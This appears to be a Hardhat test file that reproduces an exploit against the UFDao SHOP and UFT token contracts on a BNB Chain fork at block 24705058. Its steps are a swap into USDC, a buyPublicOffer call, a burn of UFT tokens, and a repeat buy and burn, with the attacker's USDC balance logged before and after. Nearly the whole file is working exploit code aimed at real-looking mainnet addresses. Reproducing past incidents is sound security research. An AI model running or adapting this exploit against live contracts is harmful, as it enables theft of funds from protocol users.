import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { expect } from 'chai'
import { IERC20, IUFT, SHOP, Uni_Router_V2 } from '../typechain-types' // Adjust the import paths according to your project's structure

describe('Tifi Exploit Test', function () {
    let attacker: Signer
    let shop: SHOP
    let uft: IUFT
    let usdc: IERC20
    let wbnb: IERC20
    let router: Uni_Router_V2
    const UF = '0x2101e0F648A2b5517FD2C5D9618582E9De7a651A'
    const USDC_ADDRESS = '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'
    const UFT_ADDRESS = '0xf887A2DaC0DD432997C970BCE597A94EaD4A8c25'
    const WBNB_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
    const SHOP_ADDRESS = '0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366'
    const ROUTER_ADDRESS = '0x10ED43C718714eb63d5aA57B78B54704E256024E'

    before(async function () {
        ;[attacker] = await ethers.getSigners()
        usdc = (await ethers.getContractAt('IERC20', USDC_ADDRESS)) as IERC20
        uft = (await ethers.getContractAt('IUFT', UFT_ADDRESS)) as IUFT
        shop = (await ethers.getContractAt('SHOP', SHOP_ADDRESS)) as SHOP
        router = (await ethers.getContractAt('Uni_Router_V2', ROUTER_ADDRESS)) as Uni_Router_V2
        wbnb = (await ethers.getContractAt('IERC20', WBNB_ADDRESS)) as IERC20
    })

    it('should block number equal to 24705058', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(24705058)
    })
    it('should attack UFDao', async function () {
        // Swap ETH for USDC
        const swapTx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(
            1, // 最小接收代币数量
            [WBNB_ADDRESS, USDC_ADDRESS], // 兑换路径 WBNB -> USDC
            await attacker.getAddress(), // 接收地址
            Math.floor(Date.now() / 1000) + 60 * 10, // 截止时间
            { value: ethers.parseEther('0.4') }, // 发送0.4 ETH
        )
        await swapTx.wait()

        // Approve SHOP contract to spend USDC
        let usdcBalance = await usdc.balanceOf(await attacker.getAddress())
        await usdc.approve(SHOP_ADDRESS, ethers.MaxUint256)
        // Check USDC balance after the exploit
        console.log(`Attacker USDC balance before exploit: ${ethers.formatUnits(usdcBalance, 18)}`)

        // Buy offer from SHOP
        await shop.connect(attacker).buyPublicOffer(UF, usdcBalance)

        // Prepare for burning UFT tokens
        let tokens: string[] = [USDC_ADDRESS]
        let adapters: string[] = []
        let pools: string[] = []
        await uft.connect(attacker).burn(usdcBalance, tokens, adapters, pools)

        let amount = 1000
        await shop.connect(attacker).buyPublicOffer(UF, amount)

        // Simulate another action, e.g., buying again after manipulation
        // const amountForSecondBuy = ethers.parseEther('1000')
        await uft.connect(attacker).burn(amount, tokens, adapters, pools)

        // Check USDC balance after the exploit
        usdcBalance = await usdc.balanceOf(await attacker.getAddress())
        console.log(`Attacker USDC balance after exploit: ${ethers.formatUnits(usdcBalance, 18)}`)
    })
})
